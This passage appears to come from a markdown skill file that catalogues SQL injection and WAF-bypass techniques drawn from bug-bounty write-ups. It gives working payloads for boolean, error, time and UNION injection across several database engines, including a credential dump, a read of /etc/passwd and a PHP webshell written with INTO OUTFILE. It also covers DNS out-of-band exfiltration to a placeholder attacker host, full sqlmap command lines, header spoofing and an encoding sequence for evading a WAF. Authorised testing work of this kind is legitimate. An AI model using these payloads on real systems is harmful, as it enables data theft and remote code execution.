**Where:** any list/table endpoint that accepts a client-controlled sort column via a JSON body parameter (`sort_by`, `order_by`, `orderBy`) rather than a fixed allowlisted string — common on dashboards, transaction histories, admin tables.

**Root cause:** the backend concatenates the `sort_by` value directly into the query's `ORDER BY` clause instead of mapping it against an allowlist of known column names and using parameterized binding — parameterized-query libraries generally *can't* parameterize identifiers/column names the way they parameterize values, so developers often skip validation on this specific parameter even in an otherwise-parameterized codebase, assuming (wrongly) that "it's just a sort direction" is low-risk input.

**Exploit steps / payloads:** since `ORDER BY` expects a column reference (or an expression that evaluates to one), a boolean condition alone won't fit — wrap it in a `CASE WHEN ... THEN <real_column> ELSE <other_column> END` so the injected clause still evaluates to a valid sortable expression, and use the *resulting sort order* itself as the boolean oracle (rows come back sorted by `transaction_date` when the condition is true, by `amount` when false — diff the response ordering, not its content):
```json
{"sort_by": "(CASE WHEN (1=1) THEN transaction_date ELSE amount END) ASC"}
{"sort_by": "(CASE WHEN (1=2) THEN transaction_date ELSE amount END) ASC"}
```
Once the true/false ordering difference is confirmed as the oracle, extract data one bit/character at a time by replacing `(1=1)` with a real subquery condition, e.g. (PostgreSQL, extracting a username's first character):
```json
{"sort_by": "(CASE WHEN (SELECT SUBSTRING(usename,1,1) FROM pg_user LIMIT 1)='a' THEN transaction_date ELSE amount END) ASC"}
```
1. Confirm baseline: send a known-valid `sort_by` value and record the row order.
2. Send the `(1=1)` vs `(1=2)` pair above and confirm the two produce *different* row orderings — that difference is your oracle, independent of any visible error or content change.
3. Automate character-by-character extraction with a binary-search `SUBSTRING`/`ASCII` condition inside the `CASE WHEN`, same methodology as any boolean-blind SQLi, just with "which of two sort orders did I get" as the signal instead of "did the page say Welcome vs Invalid."
4. If this parameter gets WAF-blocked once payloads get longer/more suspicious, feed it into sqlmap directly (`--technique=B`, `-p sort_by`) or apply this skill's tamper-script library rather than continuing purely manually.

**Generalize note:** any parameter whose only visible job is "control display/sort/formatting, not data" (sort column, sort direction, page-size, group-by field) is worth testing for this exact allowlist-skipped pattern — it's a much lower-scrutiny injection point than a search box or login field precisely because it "looks" like it can't affect which rows come back, only their order, which is exactly the blind spot that lets it slip past manual code review and lighter WAF rulesets alike.

## Recorded technique: manual error-based payload catalog (all 4 DBMS), DBMS fingerprint table, and raw WAF-evasion payloads (non-sqlmap)
Source: [Master Guide to SQL Injection (SQLi): Types, Payloads, and Evasion Techniques](https://freedium-mirror.cfd/https://systemweakness.com/master-guide-to-sql-injection-sqli-types-payloads-and-evasion-techniques-ab3da4e8194f)

Fills two gaps left by the sqlmap/Ghauri-focused entries above: (1) error-based blind payloads for PostgreSQL and Oracle (only MySQL's `updatexml()` is recorded elsewhere in this skill), and (2) the raw manual payload shapes behind sqlmap's tamper scripts, for when you're testing by hand in Burp Repeater rather than running an automated tool.

**Error-based blind — one payload per DBMS, forces the engine's own error message to leak data:**
```
MySQL (XPATH):     EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))
PostgreSQL (CAST):  CAST((SELECT password FROM users LIMIT 1) AS int)
MSSQL (CAST):       CAST((SELECT @@version) AS INT)
Oracle:             SELECT CASE WHEN (CONDITION) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
```
`EXTRACTVALUE` is `updatexml()`'s sibling function already referenced by name in this skill's `updatexml()` entry above — same 32-char XPath-error-leak mechanism, interchangeable when one is filtered. The PostgreSQL/MSSQL `CAST(... AS int)` trick works identically on both engines because casting a non-numeric string to `int` throws a conversion error whose message includes the string's own value (MSSQL: "Conversion failed when converting the varchar value '...' to data type int") — swap the subquery for anything you want leaked, one column/row at a time; `CAST((SELECT @@version) AS INT)` is the fastest way to confirm the injection point exists at all, since it leaks the full version banner in the very first error. Oracle's `1/0` division-by-zero forces `ORA-01476` only when `CONDITION` is true, making it double as a boolean *and* error-based oracle in one payload.

**Time-based blind — inline `CASE`/`IF` conditional form** (distinct from the stacked-query `'; WAITFOR DELAY...'--` shapes recorded above; use this form when the injection context is inside an existing expression rather than at a statement boundary, e.g. inside a `WHERE` clause that doesn't allow a new statement):
```
MySQL:      IF(CONDITION, SLEEP(10), 'a')
PostgreSQL: CASE WHEN (CONDITION) THEN pg_sleep(10) ELSE pg_sleep(0) END
MSSQL:      IF (CONDITION) WAITFOR DELAY '0:0:10'
Oracle:     CASE WHEN (CONDITION) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END
```

**DBMS fingerprinting reference** — cheap signal from syntax alone, useful before committing to a DBMS-specific payload:
| Feature | Oracle | MS SQL | PostgreSQL | MySQL |
|---|---|---|---|---|
| Version | `v$version` | `@@version` | `version()` | `@@version` |
| Comment styles | `--` | `--` or `/* */` | `--` or `/* */` | `#`, `--`, `/* */` |
| String concat | `\|\|` | `+` | `\|\|` | `CONCAT()` |
| Batch/stacked queries | not supported | supported (`;`) | supported (`;`) | limited |

**Column-count discovery — the mandatory step before any UNION injection.** `UNION SELECT` fails outright unless the injected query returns the exact same number of columns as the original — get this wrong and you see a generic SQL error indistinguishable from "not injectable," a common false-negative source. Two interchangeable methods:
```
?id=5 ORDER BY 1--
?id=5 ORDER BY 2--
?id=5 ORDER BY 3--   -- increment until the page errors/breaks; the last successful number is the column count

?id=5 UNION SELECT 1,2,3--   -- guess a count directly; on success, note which position(s) reflect onto the page
?id=5 UNION SELECT 1,2,NULL--  -- use NULL in place of a real number for a column whose type doesn't accept an integer
```
`ORDER BY` is generally preferred over guess-and-check `UNION SELECT` runs since it fails cleanly one column past the true count with no type-mismatch noise; once found, use `UNION SELECT 1,2,3--` with sequential integers to identify which output position(s) actually render on the page — those are the positions worth substituting with real data (`version()`, `concat(user,':',password)`, etc.) in the extraction payloads below.

**Manual UNION-based data extraction** (the raw-payload equivalents of sqlmap's `--dbs`/`--tables`/`--columns`/`--file-read`/`--file-write`, for hand-testing):
```sql
-- Schema enumeration
SELECT table_name FROM information_schema.tables
SELECT column_name FROM information_schema.columns WHERE table_name = 'USERS'

-- Credential dump via UNION
' UNION SELECT null, concat(user,':',password), null FROM users--

-- Arbitrary file read (MySQL)
' UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3--

-- Webshell drop → RCE (MySQL, requires FILE privilege + writable webroot)
' UNION SELECT "<?php system($_GET['cmd']); ?>",2 INTO OUTFILE '/var/www/html/shell.php'--
```
The `LOAD_FILE`/`INTO OUTFILE` pair is the manual version of sqlmap's `--file-read`/`--file-write` already in this skill — reach for the raw payload when sqlmap itself is being blocked/fingerprinted by the WAF but a manual UNION injection still lands.

**Raw manual WAF-evasion payload shapes** (what sqlmap's tamper scripts generate automatically — useful to know the underlying trick when testing manually or when a script needs hand-tuning):
```
Case manipulation:        sElEcT
Inline comments:          UNION/**/SELECT
Double URL encoding:      %2527  (double-encoded apostrophe)
Hex encoding:              HEX()/UNHEX()
Character-by-character:   CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)   -- builds 'SELECT' with no literal keyword in the request
Negative-index tricks (Oracle): SUBSTR('foobar', -2, 1)   -- avoids a literal positive-offset pattern some filters key on
Inverse/always-true logic: WHERE id = -1 OR 1=1   -- alternate boolean-injection shape when 'OR 1=1' alone is blocklisted
```
Map these to sqlmap tamper scripts when moving from manual confirmation to automated exploitation: case manipulation → `randomcase`, inline comments → `space2comment`, hex encoding → `charencode`/`charunicodeencode` — see the vendor-mapped tamper table above rather than reinventing the combo by hand once a manual payload confirms the injection is real.

## Recorded technique: legacy ColdFusion (.cfm) endpoint discovery → parameter fuzzing → MSSQL error-based SQLi
Source: [From "Website Not Accessible" to Critical Error-Based SQLi](https://freedium-mirror.cfd/https://medium.com/@chos3n/from-website-not-accessible-to-critical-error-based-sqli-483cda463a10)

**Where:** a target whose frontend appeared completely dead/inaccessible, but whose tech stack fingerprinted as a legacy combo — IIS 10.0, ASP.NET, and ColdFusion (CFML) on Windows Server. A dead frontend on an old stack is itself a signal: forgotten legacy endpoints tend to survive long after the app they served stopped being linked anywhere.

**Discovery chain (recon → parameter discovery → confirmation):**
1. IIS 8.3 shortname enumeration was tried first and came up empty — don't skip it (see `iis-exploitation-testing`), but don't stop there either when it fails.
2. Blind directory guesses (e.g. `/aaa`) returned verbose internal information rather than a clean 404 — a weak signal, but enough to justify continuing to dig on this host rather than moving on.
3. Wayback/archive URL mining (see `recon-scanning-toolkit`'s CDX API section) turned up an old JS file referencing three backend endpoints — this is the highest-value step in the whole chain: JS files that predate the current frontend routinely reference server-side endpoints the current UI no longer links to.
4. Directory fuzzing around one of those referenced paths (`/websnips/`) found a second, undocumented sibling endpoint: `/websnips/vstats.cfm`, which returned an HTTP 500 with `"key [NAME] doesn't exist"` — the error message itself named the missing parameter.
5. Supplying that parameter (`?name=aaa`) flipped the error to a database-level one — `"Invalid column name 'aaa'"` — with the **full SQL query text included in the response**. Verbose DB errors reflected to the client turn every subsequent step into a one-request confirm/extract cycle.
6. Confirmed and fingerprinted the DBMS in the same request that proved exploitability, using the MSSQL error-based `CAST` technique (see the DBMS-specific error-based payload table above): `/websnips/vstats.cfm?name=CAST((SELECT @@version) AS INT)` — the resulting conversion-error message leaked the full SQL Server version banner.

**Root cause:** legacy CFML code built a SQL query by directly concatenating the `name` parameter, with no parameterization and no error-message suppression, on an endpoint that had fallen out of the current frontend's linked-page graph entirely.

**Impact framing for report:** Critical — error-based SQLi with confirmed full query-text disclosure and DBMS version extraction, escalatable to full data extraction (swap the `CAST` subquery for `information_schema` lookups, credential tables, etc. per the manual UNION/error-based catalog above) and potential further compromise of a legacy, likely-unmaintained system.

**Generalize note:** treat "this domain looks dead/inaccessible" as a lead, not a dead end, whenever the stack fingerprints as legacy (old CMS, ColdFusion, classic ASP, ancient PHP framework version) — the *app* being abandoned is exactly why nobody sanitized or is monitoring these endpoints anymore. The wayback/JS-mining → directory-fuzz-around-referenced-path → verbose-error-names-the-parameter chain generalizes well beyond ColdFusion specifically; apply it any time a JS file references a backend path that 404s directly but has fuzzable siblings.

## Recorded technique: canonical manual boolean-blind extraction recipe (LENGTH-first + ASCII/SUBSTRING binary search + information_schema enumeration)
Source: [Bug Bounty Bootcamp #28 — Boolean-Based Blind SQL Injection: Extracting Data One True/False at a Time](https://freedium-mirror.cfd/https://infosecwriteups.com/bug-bounty-bootcamp-28-boolean-based-blind-sql-injection-extracting-data-one-true-false-at-a-abe69e3de702)

The other boolean-blind entries in this skill (the JSON `sort_by`/`CASE WHEN` entry above, and the Essity HackerOne boolean-blind proof sequence recorded earlier) reference "binary-search `SUBSTRING`/`ASCII` extraction" and "TRUE/FALSE oracle" conceptually without spelling out the concrete step-by-step payload sequence — this entry is that missing concrete recipe, in its most common shape: a username/registration field returning `{"taken": true/false}`.

**Step 1 — Confirm the injection is real and controllable:**
```
username=admin' AND 1=1-- -   →  {"taken": true}
username=admin' AND 1=2-- -   →  {"taken": false}
```
Both payloads use the *same* base identifier (`admin`) and differ only in the injected boolean — an application-logic difference (real vs. fake username) would affect both identically, so a response that flips between the two only because of `1=1` vs `1=2` proves the injected SQL, not the app, is controlling the result.

**Step 2 — Determine the target value's length first** (needed before character-by-character extraction, since you need to know when to stop):
```
admin' AND (SELECT LENGTH(password) FROM sqli_three.users WHERE username='admin') = 8-- -
```
Iterate the `= 8` upward (or binary-search it: `> 8`, `> 16`, etc.) until the oracle flips to `true` — that's the exact length.

**Step 3 — Binary-search each character's ASCII value:**
```
admin' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM sqli_three.users WHERE username='admin') > 64-- -
```
Binary-search the ASCII range (0-127, or 32-126 for printable-only) per character position — each request halves the remaining range, so a full character resolves in ~7 requests instead of the ~95 a linear `= 'a'`, `= 'b'`, ... sweep would take. Increment the `SUBSTRING(password,N,1)` position and repeat for the full length found in Step 2.

**Step 4 — Enumerate schema/database/table names the same way, once the technique is proven:**
```
-- How many databases exist
admin' AND (SELECT COUNT(*) FROM information_schema.schemata) = 1-- -

-- Extract database names character-by-character (same LENGTH-then-SUBSTRING pattern as Step 2/3)
admin' AND (SELECT SUBSTRING(schema_name,1,1) FROM information_schema.schemata LIMIT 0,1) = 'a'-- -

-- Confirm a table exists matching a name pattern, without knowing the exact name yet
admin' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='sqli_three' AND table_name LIKE 'u%') > 0-- -
```
The `LIMIT 0,1` / incrementing `LIMIT N,1` pattern is how you walk multiple rows (multiple databases, multiple tables) one at a time inside a single-row boolean oracle — same underlying need as this skill's MSSQL `ROW_NUMBER()`-windowing entry, just using MySQL's native `LIMIT` since it's available here.

**Automation note:** sqlmap automates this entire recipe (`--technique=B`) far faster than hand-crafting requests — reach for it once the injection is confirmed manually. The manual version above is worth doing first regardless, both to confirm the injection with high confidence before investing automated-tool time, and because writing your own extraction script (Python + `requests`, implementing exactly this LENGTH→ASCII-binary-search loop) is the fallback when sqlmap itself gets fingerprinted/blocked by a WAF and the target needs a custom low-and-slow extraction client instead.

**Generalize note:** this exact recipe — confirm with `1=1`/`1=2`, get length, binary-search ASCII per character, then repeat the length+substring pattern against `information_schema` for schema discovery — is the DBMS-agnostic skeleton underneath every boolean-blind entry in this skill; only the column/table names change per engine (`pg_user`/`usename` for PostgreSQL as in the `sort_by` entry above, `sys.tables` for MSSQL, `information_schema.schemata`/`.tables`/`.columns` for MySQL/PostgreSQL/MSSQL alike since `information_schema` is the ANSI-SQL-standard metadata view most engines implement).

## Recorded technique: AJAX-header spoofing (`X-Requested-With`/`Origin`/`Referer`) to unlock SQLi validation on a payment/booking endpoint
Source: [How I Got a Bounty by Discovering a Critical SQL Injection Vulnerability in a Public Bug Bounty](https://freedium-mirror.cfd/https://medium.com/@a7madhacck/how-i-got-a-by-discovring-a-critical-sql-injecation-vulnerability-in-a-public-bug-bounty-98c684d7eab0)

**Where:** `POST /Public/bookingAX.php` — a payment/booking-flow endpoint whose naming (`...AX.php`) itself signals it's meant to be called only via AJAX from the site's own frontend JS, not hit directly.

**Root cause:** the backend gates its input-validation/sanitization logic behind a check for AJAX-request markers (`X-Requested-With: XMLHttpRequest`, plus a matching `Origin`/`Referer`) rather than applying sanitization unconditionally — likely because the developer assumed a request without those headers could only be a stray/non-application client and routed it to a less-trusted code path, backwards from the intended security assumption. The practical effect: injecting a raw `'` into the `code` parameter with a plain, headerless request produced a generic/handled response, but the *identical* payload with the AJAX headers attached reached the actual SQL-building code path and threw a raw database error.

**Exploit steps:**
1. **First pass (fails silently — don't stop here):** test every parameter with a bare `'` using a plain request, no special headers. A clean/generic response here doesn't rule out SQLi — it may mean the request never reached the vulnerable code path at all.
2. **Add AJAX-simulation headers and retry the identical payload:**
   ```
   Origin: https://<target>
   Referer: https://<target>/<referring-page>
   X-Requested-With: XMLHttpRequest
   ```
3. Confirm via a raw, un-suppressed DB error surfacing once the headers are present — here, injecting `'` into `code` returned:
   ```
   Database Error: SQLSTATE[42000]: Syntax error... near ''500''' at line 2: select * from promouses where eventnr=500 and lower(code)='500''
   ```
   The error body itself discloses the underlying query shape (`select * from promouses where eventnr=... and lower(code)=...`), which is what tells you exactly where the injection point sits inside the query.
4. **Time-based confirmation payload once error-based access is proven:**
   ```
   500' AND (SELECT 9590 FROM (SELECT(SLEEP(8)))XFQD)-- rWRS
   ```
5. **Automate extraction with sqlmap, replicating the exact headers that unlocked the vulnerable path** — this is the critical detail; sqlmap won't reproduce the bug on its own defaults, the headers have to be passed explicitly:
   ```bash
   sqlmap -u "https://<target>/public/bookingAX.php" \
     --data="task=unlockcode&lang=de&eventnr=500&orderid=&code=500" \
     --cookie="PHPSESSID=<your-session-cookie>" \
     --headers="X-Requested-With: XMLHttpRequest\nReferer: https://<target>/itsec\nOrigin: https://<target>" \
     -p code --level=3 --risk=3 --technique=T --dbms=mysql --time-sec=8 --batch --random-agent --threads=5 --dbs
   ```
   `--technique=T` restricts to time-based blind specifically (matching the confirmed injection type from step 4), and `--dbms=mysql` skips redundant multi-engine fingerprinting once the error message in step 3 already named the engine's syntax.

**Impact:** full database enumeration capability on a payment/booking system.

**Generalize note:** any endpoint whose filename/path pattern signals it's AJAX-only (`*AX.php`, `/ajax/*`, `/api/internal/*` called exclusively from frontend JS) is worth retesting with AJAX-simulation headers even after a plain request looked clean — don't conclude "not injectable" from a headerless test alone on these specific endpoints. This is a distinct WAF/validation-bypass primitive from every other entry in this skill: instead of obfuscating the *payload* to slip past a filter, you're changing which code path the *unmodified* payload reaches in the first place. Cross-reference `recon-scanning-toolkit`'s general header-spoofing notes and `403-bypass-testing`'s trusted-header-spoofing category — same "which component trusts this header" root pattern, applied here specifically to unlock input validation rather than to unlock a 403.

## Recorded technique: manual OOB DNS/SMB exfiltration payload, second-order SQLi attack flow, and the valid-finding bar
Source: [Exploiting SQL Injection (SQLi) Vulnerabilities](https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-sql-injection-sqli-vulnerabilities)

**Where:** any target where the injectable response channel is fully blind (no reflected output, no observable timing difference, or the query executes asynchronously in a background job) — sqlmap's `--dns-domain`/`--technique=O` (already in this skill's command reference) automates the same idea, but the raw manual payload matters when sqlmap itself is blocked/fingerprinted, or the injection point is a second-order sink sqlmap can't reach directly.

**Root cause:** database engines with network-facing file functions enabled (`LOAD_FILE()` resolving a UNC path in MySQL-on-Windows, equivalent SMB/DNS-triggering functions on other engines) will attempt a real network lookup for any hostname embedded in the function argument — including one built by concatenating exfiltrated query data into the hostname string. The lookup itself (a DNS query for the crafted subdomain) reaches attacker-controlled infrastructure regardless of whether the application ever renders a response back to the browser, making this the only extraction channel that works when there's neither reflection nor a measurable timing delta.

**Exploit steps — manual OOB payload:**
```sql
SELECT name, content FROM notes WHERE id = 1 AND
(SELECT LOAD_FILE(CONCAT('\\\\', (SELECT content FROM notes WHERE id = 2), '.attacker-collab.domain\\collector')));
```
1. Confirm the DB has network-file functions enabled and outbound network access to attacker infra (a plain `LOAD_FILE(CONCAT('\\\\test.attacker-collab.domain\\a'))` canary should produce a lookup on your DNS collaborator/Burp Collaborator log).
2. Swap the canary for the real subquery (`SELECT content FROM notes WHERE id = 2`, or any sensitive column) — the subquery's result becomes part of the hostname in the resulting DNS query.
3. Read the exfiltrated value directly out of the DNS collaborator log's captured subdomain — no HTTP response inspection needed at all.
4. This generalizes past MySQL: PostgreSQL's `COPY ... TO PROGRAM`/`dblink` and MSSQL's `xp_dirtree`/`xp_fileexist` against a UNC path achieve the same DNS/SMB-triggered lookup on their respective engines when `LOAD_FILE` isn't available.

**Exploit steps — second-order SQLi (stored payload, different execution context):**
1. Submit a syntactically-safe-looking value into a stored field via a normal, unsuspicious request — e.g. creating a note with `note_name = malicious' + SLEEP(7) + '--` — which the *first* query (a simple parameterized/safe insert) stores literally with no injection triggered.
2. Trigger a *separate* feature (a scheduled reminder job, an export, a notification/digest email) that later reads that stored value back and concatenates it — unparameterized — into a *second* query: `INSERT INTO notifications (message) VALUES ('Reminder: ' + note_name)`.
3. The injection fires in the second query's context, not the first — so a scanner or manual tester probing only the original input field's *immediate* response will see nothing; the proof only shows up as a delay/side-effect on the downstream feature, at a different time and often a different code path entirely.
4. Confirmation is the same timing-oracle discipline as ordinary blind SQLi (`SLEEP(n)` and measure the delay on the *downstream* trigger, not the original submission) — just decoupled in time from the request that planted the payload.

**Valid-finding bar (useful phrasing for scoping/triage before reporting any SQLi in this skill, not just this entry):** "To qualify as a valid SQL injection, you must be able to demonstrably alter the structure or behavior of the executed SQL query" — a syntax-breaking character that merely produces a generic error page, with no proof the query's logic/structure actually changed (a timing delta, an OOB callback, a UNION column appearing, a boolean-conditional response difference), is not yet a reportable finding on its own.

**Non-destructive testing discipline:** prefer timing delays, version-extraction (`@@version`/`version()`), or OOB callbacks to prove impact during initial validation — save any actual data-exfiltration or `INTO OUTFILE`/write-primitive step for the point where impact already needs demonstrating in the report, and never run `DELETE`/`UPDATE`/`DROP`-carrying payloads against a live target even to "confirm" write access.

**Generalize note:** second-order SQLi is the same "trust boundary crossed silently" pattern behind stored XSS and blind XSS (`blind-xss-testing`) applied to SQL instead of script — the payload's danger is invisible at submission time and only detonates when a *different*, later code path reprocesses the stored value without re-sanitizing it. Whenever a target has any background job, digest email, export, or notification feature that reads back previously-submitted user data, treat every stored field as a second-order injection candidate even if the original submission endpoint tested clean.

## Recorded technique: progressive keyword-level WAF bypass by URL-encoding individual characters inside a blocked function call
Source: [Beyond the Wall: Bypassing OTP, WAF, and 403 for Exploiting a SQL Injection](https://freedium-mirror.cfd/https://medium.com/@remmy9/beyond-the-wall-bypassing-otp-waf-and-403-for-exploiting-a-sql-injection-97f06a3527c0)

**Where:** a confirmed time-based blind SQLi injection point (`1234'` already produced abnormal behavior) where the WAF specifically blocks requests containing a literal `sleep(` substring — a narrow, literal-string-match filter rather than a broader SQL-grammar-aware one.

**Root cause:** the WAF's filter matches literal byte sequences in the decoded request (keywords, whitespace patterns, parenthesis placement) rather than parsing the payload as SQL would be parsed by the database — so any transformation that changes the byte sequence the WAF sees while still being decoded back to valid SQL syntax by the time it reaches the database (via standard URL-decoding at the app/server layer) slips through. This is the same "which layer's interpretation wins" pattern as the rest of this skill's WAF-evasion payloads, just demonstrated as a worked, iterative attempt log rather than a single final payload.

**Exploit steps — the actual escalation ladder that was needed (earlier, cheaper attempts all failed in order):**
```
1234' and sleep(5)                                    → blocked (literal "sleep(" matched)
1234'/**/and/**/sleep(5)                               → blocked (comment-based whitespace substitution alone insufficient)
1234' // AND // slEEp(5)                               → blocked (case-randomization alone insufficient)
1234' %2F%2A%2A%2FAnd%2F%2A%2A%2Fsleep(5)              → blocked (encoding the comment delimiters alone insufficient)
1234'%2F%2A%2A%2FAnd%2F%2A%2A%2F%0Asleep(5)            → blocked (adding a literal newline %0A still insufficient)
1234'%2F%2A%2A%2FAnd%2F%2A%2A%2F%0Asleep(5%29          → SUCCESS (encoding the closing parenthesis as %29 was the final piece)
```
The winning payload combines *four* simultaneous evasions in one request: `/**/`-comment-as-whitespace substitution, URL-encoding the comment delimiters themselves (`%2F%2A%2A%2F`), a literal-newline byte (`%0A`) inserted before the function call, and — the piece that actually tipped it over — URL-encoding the function call's closing parenthesis (`sleep(5%29` instead of `sleep(5)`). The filter was evidently matching on the literal `sleep(...)` shape including a literal close-paren, and decoding `%29` back to `)` happened only on the application side, after the WAF had already passed the request through.

**Impact framing:** demonstrates confirmed time-based blind SQLi behind a WAF that was assumed to be blocking it — report both the underlying SQLi (primary finding) and the specific WAF bypass mechanism (strengthens severity/credibility, shows the WAF provides no real mitigation for this injection point). Submitted via VDP and accepted despite the author noting the report write-up itself was "suboptimal" — a reminder that a solid technical PoC chain can carry a weak write-up.

**Generalize note:** when a known-good blind-SQLi payload gets blocked, don't just try one evasion and give up — iterate *combinations*, and specifically test encoding individual punctuation characters inside the blocked function call (not just keywords/whitespace) since literal-string-matching WAFs often anchor on the full `functionname(args)` shape including the parenthesis. Cross-reference this skill's existing raw WAF-evasion payload-shape catalog (manual equivalents of sqlmap tamper scripts) — this is a concrete, step-by-step log of exactly that trial-and-error process against a real filter, useful as a template escalation order when sqlmap's tamper scripts aren't available or the target needs manual Burp Repeater iteration instead.

<!-- Add new recorded techniques below this line as new SQLi/WAF-bypass writeups are processed. -->
